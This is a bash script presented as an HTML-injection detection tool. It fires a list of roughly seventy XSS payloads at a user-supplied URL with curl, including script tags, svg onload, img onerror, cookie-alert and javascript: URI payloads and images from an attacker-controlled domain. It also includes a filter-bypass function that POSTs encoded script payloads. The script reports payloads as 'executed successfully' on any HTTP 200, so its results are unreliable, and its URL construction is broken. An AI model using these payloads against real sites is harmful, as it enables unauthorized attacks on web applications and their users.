#!/bin/bash
# This is a comment

# Define color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Function to perform HTML Injection detection
detect_html_injection() {
    local target_url="$1"
    echo "Detecting HTML Injection vulnerabilities..."

    # Extract base URL
    base_url=$(echo "$target_url" | cut -d'?' -f1)
    if [ -z "$base_url" ]; then
        echo -e "${RED}Invalid URL format.${NC}"
        exit 1
    fi

    # Get parameters from the URL
    parameters=$(echo "$target_url" | cut -d'?' -f2)
    if [ -z "$parameters" ]; then
        echo -e "${YELLOW}No parameters found.${NC}"
    fi

    # Define HTML Injection payloads
    payloads=(
        "';alert('XSS');//" # Single quote payload
        "><script>alert(1)</script>" # Basic script tag payload
        "<img src='http://attacker-controlled-domain.com/malicious-image.jpg' />" # Image tag payload
        "<svg/onload=alert(1)>" # SVG payload
        "<iframe src='javascript:alert(1)'></iframe>" # Iframe payload
        "<a href='javascript:alert(1)'>Click me</a>" # Anchor tag payload
        "<input type='image' src='javascript:alert(1)'>" # Input tag payload
        # Add more payloads here...
        "onmouseover=alert(1)" # onmouseover event payload
        "javascript:alert(1)" # JavaScript pseudo-protocol payload
        "<script>alert(document.cookie)</script>" # Script to steal cookies
        "<svg><script>alert(1)</script></svg>" # SVG tag payload
        "<img src=x onerror=alert(1)>" # Image tag with onerror event payload
        "<svg/onload=alert(1)>" # SVG payload
        "<svg/onload=alert(1)//>" # SVG payload with comment
        "<svg><script>alert(1)</script></svg>" # SVG tag payload
        "<img src=x onerror=alert(1)>" # Image tag with onerror event payload
        "<script>alert(String.fromCharCode(88,83,83))</script>" # Script tag with character code payload
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>" # Image tag with onerror event and character code payload
        # Add more payloads here...
        "';confirm('XSS');//" # Single quote payload with confirm dialog
        "<script>confirm(1)</script>" # Script tag with confirm dialog
        "<img src='http://attacker-controlled-domain.com/malicious-image.jpg' onmouseover='confirm(1)' />" # Image tag with onmouseover event and confirm dialog
        "<svg/onload=confirm(1)>" # SVG payload with confirm dialog
        "<iframe src='javascript:confirm(1)'></iframe>" # Iframe payload with confirm dialog
        "<a href='javascript:confirm(1)'>Click me to confirm</a>" # Anchor tag payload with confirm dialog
        "<input type='image' src='javascript:confirm(1)'>" # Input tag payload with confirm dialog
        # Add more payloads here...
    )

    # Add 50 more payloads
    for ((i=1; i<=50; i++)); do
        payloads+=("'<img src=x onerror=alert($i)>'") # Image tag with onerror event and incrementing alert
    done

    # Iterate over payloads and inject them into vulnerable parameters
    for payload in "${payloads[@]}"; do
        echo "Testing payload: $payload"
        # Construct the URL with the payload
        injection_url="$base_url?$parameters$payload"
        echo "Corresponding URL: $injection_url"
        # Send HTTP request and check response
        response=$(curl -s -o /dev/null -w "%{http_code}" "$injection_url")
        if [ "$response" -eq 200 ]; then
            echo -e "${GREEN}Payload $payload executed successfully.${NC}"
        else
            echo -e "${RED}Payload $payload failed. Response code: $response${NC}"
        fi
    done
}

# Function to bypass protection mechanisms
bypass_protection() {
    local url="$1"
    local payload="$2"

    # Try different injection points
    response=$(curl -s -o /dev/null -w "%{http_code}" -d "comment=<script>alert(1)</script>" -X POST "$url")
    if [ "$response" -eq 200 ]; then
        echo -e "${GREEN}Bypass successful. Payload $payload executed.${NC}"
        return
    fi

    # Try encoding the payload
    encoded_payload=$(urlencode "$payload")
    response=$(curl -s -o /dev/null -w "%{http_code}" -d "comment=$encoded_payload" -X POST "$url")
    if [ "$response" -eq 200 ]; then
        echo -e "${GREEN}Bypass successful with encoded payload. Payload $payload executed.${NC}"
        return
    fi

    # Add more bypass techniques here...

    # If none of the bypass techniques work
    echo -e "${RED}Bypass failed.${NC}"
}

# URL encode function
urlencode() {
    # Usage: urlencode "string"
    local string="$1"
    echo -n "$string" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g'
}

# Main function
main() {
    echo -e "${GREEN}HTML Injection Detection Tool${NC}"
    echo "------------------------------"

    # Read target URL from user input
    read -p "Enter your target URL: " target_url

    # Validate input
    if [ -z "$target_url" ]; then
        echo -e "${RED}Target URL cannot be empty.${NC}"
        exit 1
    fi

    # Perform HTML Injection detection
    detect_html_injection "$target_url"
}

# Call main function
main
